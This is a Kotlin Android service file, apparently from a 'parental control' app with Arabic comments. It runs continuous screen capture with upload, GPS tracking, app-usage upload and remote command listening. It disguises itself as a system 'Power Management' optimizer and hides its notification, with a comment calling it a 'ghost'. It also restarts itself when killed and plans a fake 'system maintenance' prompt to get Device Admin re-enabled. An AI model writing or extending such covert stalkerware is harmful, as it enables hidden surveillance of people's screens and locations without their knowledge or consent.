package com.example.parentalcontrol

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager

/**
 * Foreground Service لتشغيل جميع وحدات المراقبة في الخلفية
 * تم تحديثه ليتوافق مع Android 14 ويدعم استقراراً حرارياً وطاقة أفضل
 */
class MonitoringForegroundService : Service() {

    companion object {
        private const val TAG = "MonitoringService"
        const val CHANNEL_ID = "system_optimization_channel_v2"
        const val NOTIFICATION_ID = 1001
        const val ACTION_START = "com.android.system.optimization.engine.START"
        const val ACTION_STOP = "com.android.system.optimization.engine.STOP"
        const val EXTRA_RESULT_CODE = "extra_result_code"
        const val EXTRA_DATA = "extra_data"

        fun start(context: Context, resultCode: Int = 0, data: Intent? = null) {
            val intent = Intent(context, MonitoringForegroundService::class.java).apply {
                action = ACTION_START
                putExtra(EXTRA_RESULT_CODE, resultCode)
                putExtra(EXTRA_DATA, data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            val intent = Intent(context, MonitoringForegroundService::class.java).apply {
                action = ACTION_STOP
            }
            context.stopService(intent)
        }
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private var screenCaptureJob: Job? = null
    private var locationJob: Job? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var mediaProjection: MediaProjection? = null

    private lateinit var screenCaptureEngine: ScreenCaptureEngine
    private lateinit var gpsTracker: GpsTracker
    private lateinit var realtimeCommandManager: RealtimeCommandManager
    private lateinit var appUsageTracker: AppUsageTracker
    private lateinit var remoteConfigManager: RemoteConfigManager

    private var currentScreenshotInterval = 60_000L // الافتراضي دقيقة واحدة

    override fun onCreate() {
        super.onCreate()
        try {
            Log.i(TAG, "MonitoringForegroundService created")
            
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            // إضافة timeout للـ WakeLock لضمان عدم استهلاك البطارية للأبد في حال التعليق
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "OptimizationEngine:WakeLock").apply {
                acquire(10 * 60 * 1000L) // 10 دقائق كحد أقصى لكل لفة إن لم تجدد
            }

            createNotificationChannel()
            screenCaptureEngine = ScreenCaptureEngine(this)
            gpsTracker = GpsTracker(this)
            realtimeCommandManager = RealtimeCommandManager(this, serviceScope) { mediaProjection }
            appUsageTracker = AppUsageTracker(this)
            remoteConfigManager = RemoteConfigManager(this)
            
            realtimeCommandManager.startListening()
            startRemoteConfigLoop()
        } catch (e: Exception) {
            Log.e(TAG, "Error in onCreate: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            Log.i(TAG, "onStartCommand: ${intent?.action}")

            when (intent?.action) {
                ACTION_STOP -> {
                    stopSelf()
                    return START_NOT_STICKY
                }
                else -> {
                    // التعامل مع MediaProjection إذا تم تمريره
                    // 1. تحديد الأنواع المطلوبة مسبقاً
                    var foregroundServiceTypes = 0
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        try {
                            val hasLocationPerm = checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
                            if (hasLocationPerm) {
                                foregroundServiceTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Permission check error: ${e.message}")
                        }
                    }
                    
                    // تحسين: إضافة نوع التقاط الشاشة دائماً إذا كان مدعوماً في المانيفست
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        foregroundServiceTypes = foregroundServiceTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        foregroundServiceTypes = foregroundServiceTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    }

                    // 2. تفعيل الخدمة في الواجهة فوراً
                    val notification = buildNotification()
                    try {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && foregroundServiceTypes != 0) {
                            startForeground(NOTIFICATION_ID, notification, foregroundServiceTypes)
                        } else {
                            startForeground(NOTIFICATION_ID, notification)
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Initial startForeground failed: ${e.message}")
                        try {
                             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                                 startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                             } else {
                                 startForeground(NOTIFICATION_ID, notification)
                             }
                        } catch (ex: Exception) { Log.e(TAG, "Fatal startForeground error") }
                    }

                    // 3. التقاط MediaProjection (بعد تفعيل الـ Foreground لضمان الصلاحية)
                    val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, 0) ?: 0
                    val data = intent?.getParcelableExtra<Intent>(EXTRA_DATA)
                    
                    if (resultCode != 0 && data != null) {
                        try {
                            val mpManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                            mediaProjection = mpManager.getMediaProjection(resultCode, data)
                            Log.i(TAG, "MediaProjection acquired successfully")
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to get MediaProjection: ${e.message}")
                        }
                    }
                    
                    try {
                        startAllModules()
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to start modules: ${e.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in onStartCommand: ${e.message}")
        }

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        try {
            Log.i(TAG, "MonitoringForegroundService destroyed - attempting safe restart")
            
            if (wakeLock?.isHeld == true) wakeLock?.release()
            
            mediaProjection?.stop()
            serviceScope.cancel()
            
            // تأخير بسيط قبل محاولة إعادة التشغيل لتجنب Crash Loop
            val restartIntent = Intent(this, ServiceRestartReceiver::class.java)
            sendBroadcast(restartIntent)
            
            super.onDestroy()
        } catch (e: Exception) {
            Log.e(TAG, "Error in onDestroy: ${e.message}")
        }
    }

    private fun startAllModules() {
        startScreenCaptureLoop()
        startLocationLoop()
        startAppUsageLoop()
    }

    private fun startScreenCaptureLoop() {
        screenCaptureJob?.cancel()
        screenCaptureJob = serviceScope.launch {
            while (true) {
                try {
                    val projection = mediaProjection
                    if (projection != null) {
                        screenCaptureEngine.captureAndUpload(projection)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Screen capture loop error: ${e.message}")
                }
                
                // استخدام الفترة الزمنية القادمة من Supabase
                delay(currentScreenshotInterval)
            }
        }
    }

    private fun startRemoteConfigLoop() {
        serviceScope.launch {
            while (true) {
                try {
                    val settings = remoteConfigManager.fetchSettings()
                    if (settings != null) {
                        currentScreenshotInterval = settings.screenshot_interval_ms
                        Log.i(TAG, "Remote interval updated to: $currentScreenshotInterval ms")
                        
                        // إعادة تشغيل حلقة التصوير إذا تغير الوقت (اختياري، هنا نعتمد على اللفة القادمة)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Remote config sync error: ${e.message}")
                }
                delay(300_000L) // مزامنة كل 5 دقائق
            }
        }
    }

    private fun startLocationLoop() {
        locationJob?.cancel()
        locationJob = serviceScope.launch {
            while (true) {
                try {
                    gpsTracker.fetchAndUploadLocation()
                } catch (e: Exception) {
                    Log.e(TAG, "GPS loop error: ${e.message}")
                }
                delay(600_000L)
            }
        }
    }

    private fun startAppUsageLoop() {
        serviceScope.launch {
            while (true) {
                try {
                    // مراقبة الأذونات باستمرار (Watchdog)
                    checkPermissionsAndReprompt()
                    
                    appUsageTracker.trackAndUploadUsage()
                } catch (e: Exception) {
                    Log.e(TAG, "App usage tracking error: ${e.message}")
                }
                delay(3600_000L) // الفحص كل ساعة كافٍ لضمان الاستدامة
            }
        }
    }

    private fun checkPermissionsAndReprompt() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val adminComponent = android.content.ComponentName(this, MyDeviceAdminReceiver::class.java)
        
        if (!dpm.isAdminActive(adminComponent)) {
            Log.w(TAG, "CRITICAL: Device Admin disabled. Attempting to re-alert user.")
            // يمكن إرسال إشعار "صيانه النظام مطلوبة" لإعادة توجيه المستخدم
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = getSystemService(NotificationManager::class.java)
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Optimization Services",
                NotificationManager.IMPORTANCE_MIN // شبح: هادئ تماماً وغير ظاهر في شريط الحالة
            ).apply {
                description = "Handles essential system optimization tasks in the background"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0,
            Intent(this, HiddenSettingsActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Power Management")
            .setContentText("Optimizing battery and system performance")
            .setSmallIcon(android.R.drawable.ic_menu_preferences)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setContentIntent(pendingIntent)
            .setSilent(true)
            .build()
    }
}
